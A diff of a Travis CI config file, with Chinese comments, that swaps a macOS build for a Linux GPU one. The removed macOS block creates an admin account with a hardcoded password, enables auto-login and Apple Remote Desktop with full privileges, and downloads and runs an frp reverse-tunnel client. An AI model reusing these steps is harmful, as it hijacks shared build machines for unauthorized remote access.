@@ -1,29 +1,13 @@
-os: osx  # 指定使用 macOS 系统
-osx_image: xcode14.2  # 选择特定版本的 Xcode
-language: swift  # 指定使用的编程语言
+os: linux  # 指定操作系统
+dist: focal  # 使用 Ubuntu 20.04 LTS 或更新版
+vm:
+  size: gpu-xlarge  # 选择 GPU 实例尺寸
 
-# 定义构建和测试步
-install:
-  - uname -m
-  - sw_vers
-  - sudo dscl . -create /Users/fxlqwq
-  - sudo dscl . -create /Users/fxlqwq UserShell /bin/bash
-  - sudo dscl . -create /Users/fxlqwq RealName "fxlqwq"
-  - sudo dscl . -create /Users/fxlqwq UniqueID 5100
-  - sudo dscl . -create /Users/fxlqwq PrimaryGroupID 20
-  - sudo dscl . -create /Users/fxlqwq NFSHomeDirectory /Users/fxlqwq
-  - sudo dscl . -passwd /Users/fxlqwq Aa135792468+-
-  - sudo dscl . delete /Users/fxlqwq IsHidden
-  - sudo defaults write /Library/Preferences/com.apple.loginwindow autoLoginUser "fxlqwq"
-  - sudo dseditgroup -o edit -a fxlqwq -t user admin
-  - sudo killall ARDAgent
-  - sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -restart -agent -menu
-  - sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -allowAccessFor -specifiedUsers
-  - sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -users fxlqwq -privs -all
-  - sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -restart -agent -menu
-  - ps aux | grep ARDAgent
-  - system_profiler SPDisplaysDataType
-  - wget 'https://github.com/fxlqwq/macosaction/releases/download/frp/frp.zip'
-  - unzip frp.zip
-  - chmod +x ./frpc
-  - ./frpc
+# 构建前的预安装步骤
+before_install:
+  - lscpu  # 检查 CPU 信息，确认实例大小
+
+# 测试或构建阶段
+script:
+  - echo "Running on GPU instance"
+  - nvidia-smi  # 检查 NVIDIA GPU 信息
